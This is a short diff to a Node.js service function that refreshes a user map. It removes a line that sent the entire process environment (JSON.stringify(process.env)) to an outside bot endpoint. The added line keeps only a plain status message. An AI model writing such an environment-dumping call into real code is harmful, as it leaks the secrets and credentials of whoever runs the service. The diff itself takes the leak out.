@@ -89,7 +89,7 @@ const apiResp = {
 async function setUserMap() {
   userMap.clear();
   const db = ChannelService.getInstance();
-  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map,${JSON.stringify(process.env)}`);
+  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map`);
   const users = await db.getAllUserClients();
   clients = users
   upiIds = await db.getAllUpis()
